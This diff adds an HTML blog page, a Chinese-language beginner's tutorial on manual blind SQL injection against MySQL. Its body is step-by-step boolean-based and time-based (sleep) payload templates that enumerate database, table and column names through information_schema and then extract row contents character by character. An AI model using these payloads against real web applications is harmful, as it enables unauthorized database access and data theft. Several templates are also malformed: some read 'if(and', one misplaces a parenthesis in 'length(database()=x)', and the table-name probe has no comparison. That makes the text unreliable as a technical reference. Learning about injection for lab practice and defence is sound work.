@@ -1,0 +1,169 @@
+<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="format-detection" content="telephone=no"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black"><link rel="icon" href="/images/icons/favicon-16x16.png?v=2.7.0" type="image/png" sizes="16x16"><link rel="icon" href="/images/icons/favicon-32x32.png?v=2.7.0" type="image/png" sizes="32x32"><meta name="description" content="初识盲注">
+<meta property="og:type" content="article">
+<meta property="og:title" content="初识盲注">
+<meta property="og:url" content="https://hyggevv.github.io/2022/11/16/%E7%9B%B2%E6%B3%A8/index.html">
+<meta property="og:site_name" content="hey&#39;s blog">
+<meta property="og:description" content="初识盲注">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://hyggevv.github.io/2022/11/16/%E7%9B%B2%E6%B3%A8/1.png">
+<meta property="og:image" content="https://hyggevv.github.io/2022/11/16/%E7%9B%B2%E6%B3%A8/2.png">
+<meta property="og:image" content="https://hyggevv.github.io/2022/11/16/%E7%9B%B2%E6%B3%A8/1.jpg">
+<meta property="article:published_time" content="2022-11-16T04:10:44.000Z">
+<meta property="article:modified_time" content="2023-04-25T12:17:20.115Z">
+<meta property="article:author" content="hey">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://hyggevv.github.io/2022/11/16/%E7%9B%B2%E6%B3%A8/1.png"><title>初识盲注 | hey's blog</title><link ref="canonical" href="https://hyggevv.github.io/2022/11/16/%E7%9B%B2%E6%B3%A8/"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.12.1/css/all.min.css" type="text/css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" type="text/css"><link rel="stylesheet" href="/css/index.css?v=2.7.0"><script>var Stun = window.Stun || {};
+var CONFIG = {
+  root: '/',
+  algolia: undefined,
+  assistSearch: undefined,
+  fontIcon: {"prompt":{"success":"fas fa-check-circle","info":"fas fa-arrow-circle-right","warning":"fas fa-exclamation-circle","error":"fas fa-times-circle"},"copyBtn":"fas fa-copy"},
+  sidebar: {"offsetTop":"20px","tocMaxDepth":6},
+  header: {"enable":true,"showOnPost":true,"scrollDownIcon":false},
+  postWidget: {"endText":true},
+  nightMode: {"enable":true},
+  back2top: {"enable":true},
+  codeblock: {"style":"carbon","highlight":"light","wordWrap":false},
+  reward: false,
+  fancybox: true,
+  zoomImage: {"gapAside":"20px"},
+  galleryWaterfall: undefined,
+  lazyload: false,
+  pjax: undefined,
+  externalLink: {"icon":{"enable":true,"name":"fas fa-external-link-alt"}},
+  shortcuts: undefined,
+  prompt: {"copyButton":"Copy","copySuccess":"Copy Success","copyError":"Copy Error"},
+  sourcePath: {"js":"js","css":"css","images":"images"},
+};
+
+window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 5.4.2"></head><body><div class="container" id="container"><header class="header" id="header"><div class="header-inner"><nav class="header-nav header-nav--fixed"><div class="header-nav-inner"><div class="header-nav-menubtn"><i class="fas fa-bars"></i></div><div class="header-nav-menu"><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/"><span class="header-nav-menu-item__icon"><i class="fas fa-home"></i></span><span class="header-nav-menu-item__text">Home</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/archives/"><span class="header-nav-menu-item__icon"><i class="fas fa-folder-open"></i></span><span class="header-nav-menu-item__text">Archives</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/categories/"><span class="header-nav-menu-item__icon"><i class="fas fa-layer-group"></i></span><span class="header-nav-menu-item__text">Categories</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/tags/"><span class="header-nav-menu-item__icon"><i class="fas fa-tags"></i></span><span class="header-nav-menu-item__text">Tags</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/about/"><span class="header-nav-menu-item__icon"><i class="fas fa-user"></i></span><span class="header-nav-menu-item__text">About</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/read/"><span class="header-nav-menu-item__icon"><i class="fas fa-book"></i></span><span class="header-nav-menu-item__text">menu.read</span></a></div></div><div class="header-nav-mode"><div class="mode"><div class="mode-track"><span class="mode-track-moon"></span><span class="mode-track-sun"></span></div><div class="mode-thumb"></div></div></div></div></nav><div class="header-banner"><div class="header-banner-info"><div class="header-banner-info__title">hey's blog</div><div class="header-banner-info__subtitle">天气转晴太阳崭新我在前进</div></div></div></div></header><main class="main" id="main"><div class="main-inner"><div class="content-wrap" id="content-wrap"><div class="content" id="content"><!-- Just used to judge whether it is an article page--><div id="is-post"></div><div class="post"><header class="post-header"><h1 class="post-title">初识盲注</h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2022-11-16</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2023-04-25</span></span><span class="post-meta-item post-meta-item--visitors"><span class="post-meta-item__icon"><i class="fas fa-eye"></i></span><span class="post-meta-item__info">Visited</span><span class="post-meta-item__value" id="busuanzi_value_page_pv"></span></span></div></header><div class="post-body"><hr>
+
+        <h2 id="一：布尔型手工注入：在布尔型注入中，正确会回显，错误没有回显，以此为依据逐字爆破。">
+          <a href="#一：布尔型手工注入：在布尔型注入中，正确会回显，错误没有回显，以此为依据逐字爆破。" class="heading-link"><i class="fas fa-link"></i></a><a href="#一：布尔型手工注入：在布尔型注入中，正确会回显，错误没有回显，以此为依据逐字爆破。" class="headerlink" title="一：布尔型手工注入：在布尔型注入中，正确会回显，错误没有回显，以此为依据逐字爆破。"></a>一：布尔型手工注入：在布尔型注入中，正确会回显，错误没有回显，以此为依据逐字爆破。</h2>
+      
+        <h2 id="length-：返回字符串的长度substr-str-start-len-截取“str”字符串从第“start”位开始的“len”长度的字符ascii-：返回字符的ascii码值">
+          <a href="#length-：返回字符串的长度substr-str-start-len-截取“str”字符串从第“start”位开始的“len”长度的字符ascii-：返回字符的ascii码值" class="heading-link"><i class="fas fa-link"></i></a><a href="#length-：返回字符串的长度substr-str-start-len-截取“str”字符串从第“start”位开始的“len”长度的字符ascii-：返回字符的ascii码值" class="headerlink" title="length()：返回字符串的长度substr(str,start,len):截取“str”字符串从第“start”位开始的“len”长度的字符ascii()：返回字符的ascii码值"></a>length()：返回字符串的长度<br>substr(str,start,len):截取“str”字符串从第“start”位开始的“len”长度的字符<br>ascii()：返回字符的ascii码值</h2>
+      
+        <h2 id="思路：数量-gt-长度-gt-具体获取数据库名字的长度获取数据库的名字获取数据表的个数获取数据表名字的长度获取数据表名字获取列的个数获取列的长度获取列的具体名字获取数据的列数获取数据的长度获取具体的数据">
+          <a href="#思路：数量-gt-长度-gt-具体获取数据库名字的长度获取数据库的名字获取数据表的个数获取数据表名字的长度获取数据表名字获取列的个数获取列的长度获取列的具体名字获取数据的列数获取数据的长度获取具体的数据" class="heading-link"><i class="fas fa-link"></i></a><a href="#思路：数量-gt-长度-gt-具体获取数据库名字的长度获取数据库的名字获取数据表的个数获取数据表名字的长度获取数据表名字获取列的个数获取列的长度获取列的具体名字获取数据的列数获取数据的长度获取具体的数据" class="headerlink" title="思路：数量&gt;长度&gt;具体获取数据库名字的长度获取数据库的名字获取数据表的个数获取数据表名字的长度获取数据表名字获取列的个数获取列的长度获取列的具体名字获取数据的列数获取数据的长度获取具体的数据"></a>思路：数量&gt;长度&gt;具体<br>获取数据库名字的长度<br>获取数据库的名字<br>获取数据表的个数<br>获取数据表名字的长度<br>获取数据表名字<br>获取列的个数<br>获取列的长度<br>获取列的具体名字<br>获取数据的列数<br>获取数据的长度<br>获取具体的数据</h2>
+      
+        <h2 id="一：对数据库的猜解">
+          <a href="#一：对数据库的猜解" class="heading-link"><i class="fas fa-link"></i></a><a href="#一：对数据库的猜解" class="headerlink" title="一：对数据库的猜解"></a>一：对数据库的猜解</h2>
+      <p>(1).<br>猜解数据库长度：</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and length(database())=x</span><br></pre></td></tr></table></div></figure>
+<p>此时的x为数据库长度，此处的&#x3D;可以换成&gt;来缩小检索范围。<br>(2).<br>使用ASCII猜解数据库名</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and (ascii(substr(database(),m,n)))=x</span><br></pre></td></tr></table></div></figure>
+<p>m为数据库名字的第m个字符,n为从第m个字符起一共读取n个字符，此处的x为ascii值</p>
+<hr>
+
+        <h2 id="二：对数据表的猜解">
+          <a href="#二：对数据表的猜解" class="heading-link"><i class="fas fa-link"></i></a><a href="#二：对数据表的猜解" class="headerlink" title="二：对数据表的猜解"></a>二：对数据表的猜解</h2>
+      <p>(1).<br>猜解数据表的个数</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and (select count(table_name) from information_schema.tables where table_schema=database()) = x</span><br></pre></td></tr></table></div></figure>
+<p>x为数据表的个数<br>(2).<br>猜解表名的长度</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and length((select table_name from information_schema.tables where table_schema=database() limit m,n)) = x</span><br></pre></td></tr></table></div></figure>
+<p>此处的m表示从m+1个表开始读取,n表示只读取n+1个表，x表示表的长度<br>(3).<br>使用ASCII猜解表名</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit m,n),x,y)))</span><br></pre></td></tr></table></div></figure>
+<p>此处的m表示从第m+1个表开始读取，n表示只读取几个表；x为第几位字符；y:从第x位开始截取的字符长度为y</p>
+<hr>
+
+        <h2 id="三-对列名的猜解">
+          <a href="#三-对列名的猜解" class="heading-link"><i class="fas fa-link"></i></a><a href="#三-对列名的猜解" class="headerlink" title="三:对列名的猜解"></a>三:对列名的猜解</h2>
+      <p>(1).<br>猜取列名的个数</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and (select count(column_name) from information_schema.columns where table_schema=&#x27;数据库名&#x27; and table_name=&#x27;表名&#x27;) = x</span><br></pre></td></tr></table></div></figure>
+<p>x为列名的数量<br>(2).<br>猜取列名的长度</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and length((select column_name from information_schema.columns where table_schema=&#x27;数据库名&#x27; and table_name=&#x27;表名&#x27; limit m,n)) = x</span><br></pre></td></tr></table></div></figure>
+<p>m为从第m个列名开始读取，n为只读几个列名，x为列名的长度<br>(3).<br>猜取列名</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and ascii(substr((select column_name from information_schema.columns where table_name = &#x27;表名&#x27; and table_schema = &#x27;数据库名&#x27; limit m,n),x,y))=i</span><br></pre></td></tr></table></div></figure>
+<p>m为从第m个列名开始读取，n为只读取n个列名，x为第几位字符，y:从第x位开始共有几位字符</p>
+<hr>
+
+        <h2 id="四：对于数据的猜取">
+          <a href="#四：对于数据的猜取" class="heading-link"><i class="fas fa-link"></i></a><a href="#四：对于数据的猜取" class="headerlink" title="四：对于数据的猜取"></a>四：对于数据的猜取</h2>
+      <p>(1).<br>猜取数据的个数</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and (select count(*) from 表名)=x</span><br></pre></td></tr></table></div></figure>
+<p>x为数据的条数或者叫做列数<br>(2).<br>猜取数据的长度</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and length((select 列名 from 表名 limit m,n))=x</span><br></pre></td></tr></table></div></figure>
+<p>m为第几条数据，n为从m开始一共有几条数据<br>(3).<br>猜取数据的内容</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and ascii(substr((select 列名 from 表名 limit m,n),i,j))=x</span><br></pre></td></tr></table></div></figure>
+<p>m为第几条数据，n为从m开始一共读取n条数据；i为该数据的第i位字符，j为从第i位开始一共读取j个字符；x为该字符的ascii值</p>
+<hr>
+
+        <h2 id="至此布尔型手工盲注全部完成">
+          <a href="#至此布尔型手工盲注全部完成" class="heading-link"><i class="fas fa-link"></i></a><a href="#至此布尔型手工盲注全部完成" class="headerlink" title="至此布尔型手工盲注全部完成"></a>至此布尔型手工盲注全部完成</h2>
+      
+        <h2 id="二：时间延迟型手工注入">
+          <a href="#二：时间延迟型手工注入" class="heading-link"><i class="fas fa-link"></i></a><a href="#二：时间延迟型手工注入" class="headerlink" title="二：时间延迟型手工注入"></a>二：时间延迟型手工注入</h2>
+      
+        <h2 id="sleep-函数：延迟mysql的执行时间if-expr1-expr2-expr3-一般与sleep-函数进行配合使用；当if-expr1为真的时候返回expr2-当if-expr1为假的时候，返回expr3length-：返回字符串的长度substr-str-start-len-截取“str”字符串从第“start”位开始的“len”长度的字符ascii-：返回字符的ascii码值">
+          <a href="#sleep-函数：延迟mysql的执行时间if-expr1-expr2-expr3-一般与sleep-函数进行配合使用；当if-expr1为真的时候返回expr2-当if-expr1为假的时候，返回expr3length-：返回字符串的长度substr-str-start-len-截取“str”字符串从第“start”位开始的“len”长度的字符ascii-：返回字符的ascii码值" class="heading-link"><i class="fas fa-link"></i></a><a href="#sleep-函数：延迟mysql的执行时间if-expr1-expr2-expr3-一般与sleep-函数进行配合使用；当if-expr1为真的时候返回expr2-当if-expr1为假的时候，返回expr3length-：返回字符串的长度substr-str-start-len-截取“str”字符串从第“start”位开始的“len”长度的字符ascii-：返回字符的ascii码值" class="headerlink" title="sleep()函数：延迟mysql的执行时间if(expr1,expr2,expr3):一般与sleep()函数进行配合使用；当if expr1为真的时候返回expr2;当if expr1为假的时候，返回expr3length()：返回字符串的长度substr(str,start,len):截取“str”字符串从第“start”位开始的“len”长度的字符ascii()：返回字符的ascii码值"></a>sleep()函数：延迟mysql的执行时间<br>if(expr1,expr2,expr3):一般与sleep()函数进行配合使用；当if expr1为真的时候返回expr2;当if expr1为假的时候，返回expr3<br>length()：返回字符串的长度<br>substr(str,start,len):截取“str”字符串从第“start”位开始的“len”长度的字符<br>ascii()：返回字符的ascii码值</h2>
+      
+        <h2 id="思路：数量-gt-长度-gt-具体获取数据库名字的长度获取数据库的名字获取数据表的个数获取数据表名字的长度获取数据表名字获取列的个数获取列的长度获取列的具体名字获取数据的列数获取数据的长度获取具体的数据-1">
+          <a href="#思路：数量-gt-长度-gt-具体获取数据库名字的长度获取数据库的名字获取数据表的个数获取数据表名字的长度获取数据表名字获取列的个数获取列的长度获取列的具体名字获取数据的列数获取数据的长度获取具体的数据-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#思路：数量-gt-长度-gt-具体获取数据库名字的长度获取数据库的名字获取数据表的个数获取数据表名字的长度获取数据表名字获取列的个数获取列的长度获取列的具体名字获取数据的列数获取数据的长度获取具体的数据-1" class="headerlink" title="思路：数量&gt;长度&gt;具体获取数据库名字的长度获取数据库的名字获取数据表的个数获取数据表名字的长度获取数据表名字获取列的个数获取列的长度获取列的具体名字获取数据的列数获取数据的长度获取具体的数据"></a>思路：数量&gt;长度&gt;具体<br>获取数据库名字的长度<br>获取数据库的名字<br>获取数据表的个数<br>获取数据表名字的长度<br>获取数据表名字<br>获取列的个数<br>获取列的长度<br>获取列的具体名字<br>获取数据的列数<br>获取数据的长度<br>获取具体的数据</h2>
+      <p>在开始进行注入前我们先对此进行一个验证</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and sleep(10)</span><br></pre></td></tr></table></div></figure>
+<p><img src="/2022/11/16/%E7%9B%B2%E6%B3%A8/1.png"><br><img src="/2022/11/16/%E7%9B%B2%E6%B3%A8/2.png"><br>此时发现确实是延迟了；所以我们便可以开始了</p>
+<hr>
+
+        <h2 id="一：对数据库的猜解-1">
+          <a href="#一：对数据库的猜解-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#一：对数据库的猜解-1" class="headerlink" title="一：对数据库的猜解"></a>一：对数据库的猜解</h2>
+      <p>(1)<br>猜解数据库名称的长度</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and if(length(database()=x),sleep(y),0)</span><br></pre></td></tr></table></div></figure>
+<p>x为数据库的长度；y是你需要延迟的时间<br>(2)<br>猜解数据库的名称</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and if(ascii(substr(database(),x,y))=m,sleep(n),0)</span><br></pre></td></tr></table></div></figure>
+<p>x为数据库名称的第几位，y是从x位开始一共截取的位数；m为ascii值，n为延迟的时间</p>
+<hr>
+
+        <h2 id="二：对数据表的猜解-1">
+          <a href="#二：对数据表的猜解-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#二：对数据表的猜解-1" class="headerlink" title="二：对数据表的猜解"></a>二：对数据表的猜解</h2>
+      <p>(1)<br>猜解数据表的个数</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and if((select count(table_name) from information_schema.tables where table_schema=database()) = x,sleep(y),0)</span><br></pre></td></tr></table></div></figure>
+<p>x为数据表的个数，y为延迟的时间<br>(2)<br>猜解数据表的长度</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and if(length((select table_name from information_schema.tables where table_schema=database() limit m,n)) = x,sleep(y),0)</span><br></pre></td></tr></table></div></figure>
+<p>m为第从m+1个表开始读取；n为一共读取几个表；x为该表的长度；y为延迟的时间<br>(3)<br>猜解数据表的名称</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and if((ascii(substr((select table_name from information_schema.tables where table_schema=database() limit m,n),x,y))),sleep(i),0)</span><br></pre></td></tr></table></div></figure>
+<p>m为从第m+1个表开始读取，n为一共读取几个表；x为表的第几个字符，y为从x字符开始，一共读取几个字符；i为<br>延迟时间</p>
+<hr>
+
+        <h2 id="三：对列名的猜取">
+          <a href="#三：对列名的猜取" class="heading-link"><i class="fas fa-link"></i></a><a href="#三：对列名的猜取" class="headerlink" title="三：对列名的猜取"></a>三：对列名的猜取</h2>
+      <p>(1)<br>猜取列名的个数</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and if(and (select count(column_name) from information_schema.columns where table_schema=&#x27;数据库名&#x27; and table_name=&#x27;表名&#x27;) = x,sleep(y),0)</span><br></pre></td></tr></table></div></figure>
+<p>x为列名的个数，y为延迟的时间<br>(2)<br>猜取列名的长度</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and if(and length((select column_name from information_schema.columns where table_schema=&#x27;数据库名&#x27; and table_name=&#x27;表名&#x27; limit m,n)) = x,sleep(y),0)</span><br></pre></td></tr></table></div></figure>
+<p>m为第m+1个列名，n为一共读取几个列名；x为该列名的长度，y为延迟的时间<br>(3)<br>猜取列名</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and if(and ascii(substr((select column_name from information_schema.columns where table_name = &#x27;表名&#x27; and table_schema = &#x27;数据库名&#x27; limit m,n),x,y))=i,sleep(j),0)</span><br></pre></td></tr></table></div></figure>
+<p>m为从第几个列名开始，n为一共读取几个列名；x为该列名的第x个字符，y为从第x个字符开始，一共读取y个字符，i为该字符的ascii值；j为延迟的时间</p>
+<hr>
+
+        <h2 id="四：猜解数据">
+          <a href="#四：猜解数据" class="heading-link"><i class="fas fa-link"></i></a><a href="#四：猜解数据" class="headerlink" title="四：猜解数据"></a>四：猜解数据</h2>
+      <p>(1)<br>猜解数据的个数</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and if((select count(*) from 表名)=x,sleep(y),0)</span><br></pre></td></tr></table></div></figure>
+<p>x为数据的条数，y为延迟的时间<br>(2)<br>猜解数据的长度</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and if(and length((select 列名 from 表名 limit m,n))=x,sleep(y),0)</span><br></pre></td></tr></table></div></figure>
+<p>m为第几条数据，n为从m开始，一共有几条数据；x为该数据的长度，y为延迟的时间<br>(3)<br>猜解数据</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and if(ascii(substr((select 列名 from 表名 limit m,n),i,j))=x,sleep(y),0)</span><br></pre></td></tr></table></div></figure>
+<p>m为第几条数据，n为从m开始一共读取n条数据；i为该数据的第i位字符，j为从第i位开始一共读取j个字符；x为该字符的ascii值，y为延迟的时间</p>
+<hr>
+
+        <h2 id="至此时间延迟型手工注入完成">
+          <a href="#至此时间延迟型手工注入完成" class="heading-link"><i class="fas fa-link"></i></a><a href="#至此时间延迟型手工注入完成" class="headerlink" title="至此时间延迟型手工注入完成"></a>至此时间延迟型手工注入完成</h2>
+      <p>最后附上一张ascii表<br><img src="/2022/11/16/%E7%9B%B2%E6%B3%A8/1.jpg"></p>
+</div><footer class="post-footer"><div class="post-ending ending"><div class="ending__text">------ END ------</div></div><div class="post-copyright copyright"><div class="copyright-author"><span class="copyright-author__name">Author: </span><span class="copyright-author__value"><a href="https://hyggevv.github.io">hey</a></span></div><div class="copyright-link"><span class="copyright-link__name">Link: </span><span class="copyright-link__value"><a href="https://hyggevv.github.io/2022/11/16/%E7%9B%B2%E6%B3%A8/">https://hyggevv.github.io/2022/11/16/%E7%9B%B2%E6%B3%A8/</a></span></div><div class="copyright-notice"><span class="copyright-notice__name">Copyright: </span><span class="copyright-notice__value">All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" rel="external nofollow" target="_blank">BY-NC-SA</a> unless stating additionally</span></div></div><nav class="post-paginator paginator"><div class="paginator-prev"><a class="paginator-prev__link" href="/2022/11/18/sqlilabs17/"><span class="paginator-prev__icon"><i class="fas fa-angle-left"></i></span><span class="paginator-prev__text">Sqli-labs-Less-17 Dumb Hacker</span></a></div><div class="paginator-next"><a class="paginator-next__link" href="/2022/11/15/sqlmap/"><span class="paginator-prev__text">sqlmap初体验</span><span class="paginator-next__icon"><i class="fas fa-angle-right"></i></span></a></div></nav></footer></div></div></div><div class="sidebar-wrap" id="sidebar-wrap"><aside class="sidebar" id="sidebar"><div class="sidebar-nav"><span class="sidebar-nav-toc current">Catalog</span><span class="sidebar-nav-ov">Overview</span></div><section class="sidebar-toc"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%EF%BC%9A%E5%B8%83%E5%B0%94%E5%9E%8B%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5%EF%BC%9A%E5%9C%A8%E5%B8%83%E5%B0%94%E5%9E%8B%E6%B3%A8%E5%85%A5%E4%B8%AD%EF%BC%8C%E6%AD%A3%E7%A1%AE%E4%BC%9A%E5%9B%9E%E6%98%BE%EF%BC%8C%E9%94%99%E8%AF%AF%E6%B2%A1%E6%9C%89%E5%9B%9E%E6%98%BE%EF%BC%8C%E4%BB%A5%E6%AD%A4%E4%B8%BA%E4%BE%9D%E6%8D%AE%E9%80%90%E5%AD%97%E7%88%86%E7%A0%B4%E3%80%82"><span class="toc-number">1.</span> <span class="toc-text">
+          一：布尔型手工注入：在布尔型注入中，正确会回显，错误没有回显，以此为依据逐字爆破。</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#length-%EF%BC%9A%E8%BF%94%E5%9B%9E%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%9A%84%E9%95%BF%E5%BA%A6substr-str-start-len-%E6%88%AA%E5%8F%96%E2%80%9Cstr%E2%80%9D%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%BB%8E%E7%AC%AC%E2%80%9Cstart%E2%80%9D%E4%BD%8D%E5%BC%80%E5%A7%8B%E7%9A%84%E2%80%9Clen%E2%80%9D%E9%95%BF%E5%BA%A6%E7%9A%84%E5%AD%97%E7%AC%A6ascii-%EF%BC%9A%E8%BF%94%E5%9B%9E%E5%AD%97%E7%AC%A6%E7%9A%84ascii%E7%A0%81%E5%80%BC"><span class="toc-number">2.</span> <span class="toc-text">
+          length()：返回字符串的长度substr(str,start,len):截取“str”字符串从第“start”位开始的“len”长度的字符ascii()：返回字符的ascii码值</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%9D%E8%B7%AF%EF%BC%9A%E6%95%B0%E9%87%8F-gt-%E9%95%BF%E5%BA%A6-gt-%E5%85%B7%E4%BD%93%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D%E5%AD%97%E7%9A%84%E9%95%BF%E5%BA%A6%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E5%90%8D%E5%AD%97%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE%E8%A1%A8%E7%9A%84%E4%B8%AA%E6%95%B0%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE%E8%A1%A8%E5%90%8D%E5%AD%97%E7%9A%84%E9%95%BF%E5%BA%A6%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE%E8%A1%A8%E5%90%8D%E5%AD%97%E8%8E%B7%E5%8F%96%E5%88%97%E7%9A%84%E4%B8%AA%E6%95%B0%E8%8E%B7%E5%8F%96%E5%88%97%E7%9A%84%E9%95%BF%E5%BA%A6%E8%8E%B7%E5%8F%96%E5%88%97%E7%9A%84%E5%85%B7%E4%BD%93%E5%90%8D%E5%AD%97%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE%E7%9A%84%E5%88%97%E6%95%B0%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE%E7%9A%84%E9%95%BF%E5%BA%A6%E8%8E%B7%E5%8F%96%E5%85%B7%E4%BD%93%E7%9A%84%E6%95%B0%E6%8D%AE"><span class="toc-number">3.</span> <span class="toc-text">
+          思路：数量&gt;长度&gt;具体获取数据库名字的长度获取数据库的名字获取数据表的个数获取数据表名字的长度获取数据表名字获取列的个数获取列的长度获取列的具体名字获取数据的列数获取数据的长度获取具体的数据</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%EF%BC%9A%E5%AF%B9%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E7%8C%9C%E8%A7%A3"><span class="toc-number">4.</span> <span class="toc-text">
+          一：对数据库的猜解</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%EF%BC%9A%E5%AF%B9%E6%95%B0%E6%8D%AE%E8%A1%A8%E7%9A%84%E7%8C%9C%E8%A7%A3"><span class="toc-number">5.</span> <span class="toc-text">
+          二：对数据表的猜解</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%89-%E5%AF%B9%E5%88%97%E5%90%8D%E7%9A%84%E7%8C%9C%E8%A7%A3"><span class="toc-number">6.</span> <span class="toc-text">
+          三:对列名的猜解</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9B%9B%EF%BC%9A%E5%AF%B9%E4%BA%8E%E6%95%B0%E6%8D%AE%E7%9A%84%E7%8C%9C%E5%8F%96"><span class="toc-number">7.</span> <span class="toc-text">
+          四：对于数据的猜取</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%87%B3%E6%AD%A4%E5%B8%83%E5%B0%94%E5%9E%8B%E6%89%8B%E5%B7%A5%E7%9B%B2%E6%B3%A8%E5%85%A8%E9%83%A8%E5%AE%8C%E6%88%90"><span class="toc-number">8.</span> <span class="toc-text">
+          至此布尔型手工盲注全部完成</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%EF%BC%9A%E6%97%B6%E9%97%B4%E5%BB%B6%E8%BF%9F%E5%9E%8B%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5"><span class="toc-number">9.</span> <span class="toc-text">
